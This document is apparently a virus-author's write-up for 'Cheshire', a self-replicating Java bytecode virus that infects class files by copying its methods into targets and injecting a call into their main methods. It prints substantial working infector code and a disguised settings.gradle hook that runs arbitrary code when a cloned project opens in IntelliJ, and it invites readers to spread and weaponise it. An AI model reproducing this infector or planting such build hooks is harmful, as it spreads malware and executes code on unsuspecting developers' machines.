# Virus:Java/Cheshire.A

![Cheshire Cat](cheshire.png)
by Bot

Greetings: Coldzer0, Smelly, Neogram

## Cheshire
This is the first version of my bytecode virus for the JVM. This code is functional on JVM version 8 and higher. Along 
with being capable of file infection, this virus was written to accomodate the user. Namely, this virus allows 
the user to write some code in Java and instantly use it as a viral payload. Users can easily copy any function 
or code to the target. We don't want to add additional libraries to our code so it's important to keep whatever payload 
you add to what is available as standard Java libraries. Fortunately, the JVM's standard library is enormous and very flexible.

## Goals 
Why would I write a virus for Java? There are a few reasons:
- Cross platform, no need to select binaries
- Rarity - I have not found a complete JVM virus on the web.
- Flexibility. JVM bytecode is much easier to manipulate than cpu opcodes and binary file formats. 



## Prior Work
It appears there has not been a full Java virus in years. The only existing Java virus I could locate was
 [Strangebrew](http://virus.wikidot.com/strangebrew), which was coded in 2001. Unfortunately even in this case the full 
  source was not disclosed. This virus would also not function in today's world, as Java has required bytecode verification
  since that time. 

There could be many causes for this. I was not able to find any other documented cases of a Java virus actually functioning. 
While I was not able to find the source code for StrangeBrew, according to Symantec, the implementation was a bit buggy. 
Upon starting the work I've done here, this might have sounded like an error on the part of the virus author, but we 
will see that creating a fully functioning self-contained virus for the JVM is not a simple task.

## Design Overview

## File Infection Strategy
Cheshire infects any class file that contains a main function because this method is standard and reliable. All virus methods are static so they can easily be injected into and run from any 
class. I chose to implement my own class file parser and infector because adding an entire library to a target is too 
easy to spot, limits us if we want to develop more advanced features such as poly or metamorphism and just requires copying
too much data in general. In its current state, this virus is about 30kb. While large, it's much better than requiring entire
jar files simply to operate.  

### The Java Class File Format
To create a virus that infects other executable files, we must first understand the executable format we are dealing with.
_I have absorbed [this page](https://docs.oracle.com/javase/specs/jvms/se7/html/jvms-4.html) into my very being and no 
longer understand anything about myself or the world around me._ Instead of traditional machine code, Java executables make use of bytecode. This allows portability without the software
 authors needing to think about the platform they are writing code for. We have to consider the following aspects of the 
 .class file form:
 - Which items are in the constant pool
 - Which methods are available in the class
 - Do the offsets used in our instruction operands match the offsets of our newly modified code and our newly placed constants
 - How to adjust stack frames based on our modification of our target

#### The Constant Pool
Just like the data section of an ELF file, .class files have something called a Constant Pool to store information needed 
by code. This is a listing of constant resources for the code to refer to as it runs. This can be anything from Strings 
and Numbers to Objects, Methods and many other things. The formatting of the constant pool is very simple: each item is 
given an index to which every other constant pool item, method and instruction may refer to. For our purposes, any 
constant pool items we need to add can simply be appended to the target's constant pool. This will not cause any issues 
with code verification or loading. 

#### Methods
In a fashion similar to the constant pool, every method has an index. Our code has a few tasks when it comes to manipulating methods:
1) Read our own methods into memory so that we may copy them
2) Find methods in target code that we can infect. In our case, any main method will do
3) Inject our methods into the target class
4) Modify the code of the main method to invoke our virus code before continuing as normal

#### Code
Code is perhaps the simplest part of the entire class file format. Every instruction is loaded with some number of 
operands following it. There can only be up to 255 JVM bytecode instructions so the set we need to understand is pretty 
small compared to x86. The format of this data is simply an opcode followe by operands. 

#### The Stack Map Table
After Java 7, you can no longer simply throw instructions into a method and expect functioning program. To make type guarantees
about code at runtime, Java maps out which variables are in the JVM's stack frame at any given time and for how long these
conditions apply. Every stackmapframe applies for some number of instructions indicated by an offset from the current 
instruction being executed. 

This is by far the hardest part to get right. Before Java runs code, it verifies that the code being loaded refers to 
variables that are consistent with the types defined by the code. This would be fine normally, except for _a few complications._ 

#### The Challenge
So why is all of this hard? We run into a problem: several java instructions, one of which we use regularly, actually 
have 2 different implementations. Some instructions will refer to constant pool values and take an 
argument as a single unsigned byte(addressing up to 255 items) or two bytes(up to 65535 items). If we are appending our 
needed constants to a target constant pool and the pool has more than 255 items, we need to decide whether to use the 
instruction the original instruction that our compiler chose or a _new_ instruction addressing the correct number of 
possible constants. 

We could simply choose to hardcode our solution to only ever use 2 byte addressing and start only with lower numbers, 
but ideally our code should be able to copy whatever methods we give it to copy and not simply some very specific code. 
The viurs should be flexible and allow for advanced payloads specific by the user. Otherwise we are very limited in what we can do and
 create more overead if we want to implement advanced features like polymoprhism or even metamorphism.

## Implementation

### Copying resources to the target

This is probably the easiest part of the whole process. Our code for doing this is:

```java    
public static int copyConstant(HashMap<String, Object> origin, int origin_index, HashMap<String, Object> destination){
    byte[][] constant_pool = (byte[][]) origin.get("constant_pool");
    byte[] orig_constant = constant_pool[origin_index-1];

    //Create a map between the old and new constant pools
    //This will help us avoid copying too many vars over and being wasteful
    if(origin.get("constant_pool_map") == null){
        HashMap<Integer, Integer> constant_pool_map = new HashMap<Integer, Integer>();
        origin.put("constant_pool_map", constant_pool_map);
    }
    HashMap<Integer, Integer> constant_pool_map = (HashMap<Integer, Integer>) origin.get("constant_pool_map");
    if(constant_pool_map.keySet().contains(origin_index)){
        return constant_pool_map.get(origin_index);
    }
    int const_tag = orig_constant[0];
    if(const_tag == 1){
        int new_index = addToPool(destination, orig_constant);
        constant_pool_map.put(origin_index, new_index);
        return new_index;
    }
    else if(const_tag == 7){
        ByteBuffer b = ByteBuffer.allocate(3);
        int orig_name_index = (short) (((orig_constant[1] & 0xFF) << 8) | (orig_constant[2] & 0xFF));
        int new_name_index = copyConstant(origin, orig_name_index, destination);
        b.put(orig_constant[0]);
        b.putShort((short) new_name_index);
        byte[] new_constant = b.array();
        int new_index;
        if(getClassName(origin).equals(getUtf8Constant(orig_name_index, origin))){
            byte[] selfClassBytes = (byte[]) destination.get("this_class");
            ByteBuffer selfBytes = ByteBuffer.wrap(selfClassBytes);
            new_index = selfBytes.getShort();
        }
        else{
            new_index = addToPool(destination, new_constant);
            constant_pool_map.put(origin_index, new_index);
        }
        return new_index;
    }
    else if(const_tag == 9 || const_tag == 10 || const_tag == 11){
        ByteBuffer b = ByteBuffer.allocate(5);
        int orig_class_index = (short) (((orig_constant[1] & 0xFF) << 8) | (orig_constant[2] & 0xFF));
        int new_class_index = copyConstant(origin, orig_class_index, destination);
        String thisClass = getClassName(origin);
        byte[] methodClassBytes = constant_pool[orig_class_index-1];
        ByteBuffer methodClassBuffer = ByteBuffer.wrap(methodClassBytes);
        methodClassBuffer.get();
        int classNameIndex = methodClassBuffer.getShort();
        String methodClassName = getUtf8Constant(classNameIndex, origin);

        if(methodClassName.equals(getClassName(origin))){
            byte[] selfClassBytes = (byte[]) destination.get("this_class");
            byte[][] t_constant_pool = (byte[][]) destination.get("constant_pool");
            ByteBuffer selfBytes = ByteBuffer.wrap(selfClassBytes);
            new_class_index = selfBytes.getShort();
        }
        b.put(orig_constant[0]);
        b.putShort((short) new_class_index);
        int orig_name_and_type_index = (short) (((orig_constant[3] & 0xFF) << 8) | (orig_constant[4] & 0xFF));
        int new_name_and_type_index = copyConstant(origin, orig_name_and_type_index, destination);
        b.putShort((short) new_name_and_type_index);
        byte[] new_constant = b.array();
        int new_index = addToPool(destination, new_constant);
        constant_pool_map.put(origin_index, new_index);
        return new_index;
    }
    else if(const_tag == 8){
        ByteBuffer b = ByteBuffer.allocate(3);
        b.put(orig_constant[0]);
        int orig_string_index = (short) (((orig_constant[1] & 0xFF) << 8) | (orig_constant[2] & 0xFF));
        int new_string_index = copyConstant(origin, orig_string_index, destination);
        b.putShort((short) new_string_index);
        byte[] new_constant = b.array();
        int new_index = addToPool(destination, new_constant);
        constant_pool_map.put(origin_index, new_index);
        return new_index;
    }
    else if(const_tag == 3 || const_tag == 4 || const_tag == 5 || const_tag == 6){
        int new_index = addToPool(destination, orig_constant);
        constant_pool_map.put(origin_index, new_index);
        return new_index;
    }
    else if(const_tag == 12){
        ByteBuffer b = ByteBuffer.allocate(5);
        b.put(orig_constant[0]);
        int orig_name_index = (short) (((orig_constant[1] & 0xFF) << 8) | (orig_constant[2] & 0xFF));
        int new_name_index = copyConstant(origin, orig_name_index, destination);
        b.putShort((short) new_name_index);
        int orig_descriptor_index = (short) (((orig_constant[3] & 0xFF) << 8) | (orig_constant[4] & 0xFF));
        int new_descriptor_index = copyConstant(origin, orig_descriptor_index, destination);
        b.putShort((short) new_descriptor_index);
        byte[] new_constant = b.array();
        int new_index = addToPool(destination, new_constant);
        constant_pool_map.put(origin_index, new_index);
        return new_index;
    }
    else if(const_tag == 15){
        ByteBuffer b = ByteBuffer.allocate(4);
        b.put(orig_constant[0]);
        b.put(orig_constant[1]);
        int old_reference_index = (short) (((orig_constant[2] & 0xFF) << 8) | (orig_constant[3] & 0xFF));
        int new_reference_index = copyConstant(origin, old_reference_index, destination);
        b.putShort((short) new_reference_index);
        byte[] new_constant = b.array();
        int new_index = addToPool(destination, new_constant);
        constant_pool_map.put(origin_index, new_index);
        return new_index;
    }
    else if(const_tag == 16){
        ByteBuffer b = ByteBuffer.allocate(3);
        b.put(orig_constant[0]);
        int orig_descriptor_index = (short) (((orig_constant[1] & 0xFF) << 8) | (orig_constant[2] & 0xFF));
        int new_descriptor_index = copyConstant(origin, orig_descriptor_index, destination);
        b.putShort((short) new_descriptor_index);
        byte[] new_constant = b.array();
        int new_index = addToPool(destination, new_constant);
        constant_pool_map.put(origin_index, new_index);
        return new_index;
    }
    else if(const_tag == 18){
        ByteBuffer b = ByteBuffer.allocate(5);
        b.put(orig_constant[0]);
        b.put(orig_constant[1]);
        b.put(orig_constant[2]);
        int orig_name_and_type_index = (short) (((orig_constant[3] & 0xFF) << 8) | (orig_constant[4] & 0xFF));
        int new_name_and_type_index = copyConstant(origin, orig_name_and_type_index, destination);
        b.putShort((short) new_name_and_type_index);
        byte[] new_constant = b.array();
        int new_index = addToPool(destination, new_constant);
        constant_pool_map.put(origin_index, new_index);
        return new_index;
    }
    else{
        return -1;
    }
}
```

Essentially we create a function that keeps track of constants in both the origin and the target's constant pools. Whenever
we want to copy an item over, we do a quick check to see if we've already copied that item. If so, simply return
the index of the item instead of copying again. The JVM generally does not care too much about what you put in the constant
pool as long as it's a valid constant.

### Moving Methods

Copying a method from the source to the target is trickier than it sounds. While adding a method to a compiled class is 
merely a matter of adding it to an index of methods, the real challenge is in ensuring the instructions for the method being
 copied point to the correct resources and offsets. We have a useful function for consistently referring to the correct 
 constant pool resources but we need a way to consistently calculate the correct instruction positions and offsets for our
 methods to actually function at runtime. 
 
 The workhorse of the virus for this is the instructionIndex method:
 ```java
public static int instructionIndex(int index, ArrayList<byte[]> oldList, ArrayList<byte[]> newList){
    int oldposition = 0;
    int newposition = 0;
    int remainder = 0;
    int instruction_pos = 0;
    int list_offset = 0;
    if(oldList.size() != newList.size()){
        list_offset = newList.size() - oldList.size();
    }
    // Step one: Convert old index
    while(oldposition < index){
        if(oldposition + oldList.get(instruction_pos).length <= index){
            oldposition += oldList.get(instruction_pos).length;
            instruction_pos += 1;
        }
        else if(oldposition + oldList.get(instruction_pos).length > index){
            oldposition += oldList.get(instruction_pos).length;
            instruction_pos += 1;
            remainder = oldposition - index;
            oldposition -= remainder;
        }
    }
    instruction_pos += list_offset;
    //Step two: Convert instruction_pos + remainder to new position
    for(int i = 0; i < instruction_pos; i++){
        newposition += newList.get(i).length;
    }
    return newposition;
}
```

There's no magic here. Essentially we just need to translate the original position of some code
to the new position of the same code after it has been modified.  This function ends up being 
heavily leveraged throughout the rest of the virus. For the excruitiating details of 
how this is used to adjust instruction operands, see the processInstructions method in SelfExamine.java.

### The StackMapTable

A virus for the JVM would be very easy if it were not for the Stack Map Table. This ~~fucking~~  mechanism gives
reasonable type safety guarantees, but requiring specific code offsets for certain kinds of stack conditions to apply
complicates the process of injecting code. Essentially we have to not only recalculate our own code as
we copy it due to the new positions of our constants in the constant pool and the new sizes and positions of our copied
instructions, but we also have to calculate what the offsets should be if we add code to existing code. 

Since we are aiming to inject instructions directly into our target's main method without causing a crash, we need
to think about this quite a bit. However it's worth noting that this is still dramatically easier than doing this for an
x86 instruction set. 

The code to calculate the correct StackMapTable offsets can be found in processAttribute. All I'm going to say about it 
is that it took forever to get functioning without errors. 

### Injection

The last part of our process after we copy our methods is actually inject instructions into a function that we did not 
write and have no control over. The good news for me is that this didn't require too much extra work.

```java
public static void inject(HashMap<String, Object> origin, HashMap<String, Object> destination){
    //Are there any functions called main?
    //Get the method, get the code attribute, extract code, place instruction and see if we can extend StackMapFrame
    //We should parse through the constant pool, look for the methodref with our method name and capture the index
    byte[][] constant_pool = (byte[][]) origin.get("constant_pool");
    int methodRefIndex;
    byte[] instruction_bytes = new byte[3];

    //Since our main virus method is never invoked in any of the methods we've copied, we need to copy the MethodRef
    //For that method manually.

    //Find the Constant Pool index of the MethodRef for our virus.
    for(int i = 0; i < constant_pool.length; i++){
        byte[] constant = constant_pool[i];

        if(constant[0] == (byte) 10){
            byte[] natindexbytes = new byte[2];
            System.arraycopy(constant, 3 , natindexbytes, 0, 2);
            int NameAndTypeIndex = (short) (((natindexbytes[0] & 0xFF) << 8) | (natindexbytes[1] & 0xFF));
            byte[] NameAndType = constant_pool[NameAndTypeIndex-1];
            byte[] nameindexbytes = new byte[2];
            System.arraycopy(NameAndType, 1, nameindexbytes, 0, 2 );
            int NameIndex = (short) (((nameindexbytes[0] & 0xFF) << 8) | (nameindexbytes[1] & 0xFF));
            String methodName = getUtf8Constant(NameIndex, origin);
            if(methodName.equals("Cheshire")){
                methodRefIndex = i+1;
                methodRefIndex = copyConstant(origin, methodRefIndex, destination);
                ByteBuffer bb = ByteBuffer.allocate(2);
                bb.putShort((short) methodRefIndex);
                byte[] index_bytes = bb.array();
                byte invokestatic = (byte) 184;
                instruction_bytes[0] = invokestatic;
                instruction_bytes[1] = index_bytes[0];
                instruction_bytes[2] = index_bytes[1];
                ArrayList<byte[]> inject_instructions = new ArrayList<byte[]>();
                inject_instructions.add(instruction_bytes);
                destination.put("inject_instructions", inject_instructions);
            }
        }
    }

    byte[][] methods = (byte[][]) destination.get("methods");
    for(int i = 0; i < methods.length; i++){
        ByteBuffer b = ByteBuffer.wrap(methods[i]);
        b.get(new byte[2]);
        int nameIndex = b.getShort();
        b.get(new byte[4]);
        String methodName = getUtf8Constant(nameIndex, destination);
        if(methodName.equals("main")){
            try {
                copyMethod((HashMap<String, Object>) destination.clone(), i, destination);
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
}
```
Since our main virus method is never called by any of the other functions we've written, we have to copy the MethodRef 
for that function to the target ourselves. We need to do this to use the invokestatic opcode, which is what we're sticking with
 for execution. As you can see, I horribly bastardized my own code here by adding the newly generated instruction to an item in the destination's HashMap. This is horrible and I'm sorry.
It does however appear to have worked so there's that.

## Transmission Mechanism

One thing I've bundled with this virus is a very simple but effective way to help this virus spread. We know that we're 
interested in infecting .class files inside of Jars, but simply allowing it to happen and spread over time would tkae a while.

After some digging into how we might abuse build systems to spread our code, I stumbled on to the somewhat surprising fact
that it is trivially easy to trigger code execution when somebody clones a gradle project in IntelliJ IDEA. This trick 
probably also works in Android studio. I haven't tried it myself - maybe you should :)

The trick is very simple:

In settings.gradle in your project, place some innocent looking comments and code:
```gradle
task testSuite(type: JavaExec) {
    jar
    classpath = files('build/libs/BytecodeVirus-1.0-SNAPSHOT.jar')
    classpath += sourceSets.main.runtimeClasspath
    main = "Goat"
}

void autoBuild(){
    testSuite
    String classpath = sourceSets
    exec {commandLine 'calc.exe'}

}

build{
    autoBuild();
}
```

We can quickly talk about what this does. The trick is very simple. We can define a custom task for gradle
to run upon build. In IntelliJ IDEA, build is run every time a project is opened. For dramatic effect I've made
this code launch calc.exe but you could easily be much sneakier. ***The result of this obvious issue is that we can
get execution on clone in IntelliJ IDEA.*** Give it a try :)

## End Result 
The end result of this effort is a set of self-replicating bytecode that is only a few steps away from being pretty
weaponizable. There are a lot of improvements I would have made to this code if I had the time, but hopefully a codebase
to create viral code just by using an IDE as normal is enough for now. Hope you enjoyed. Until next time.
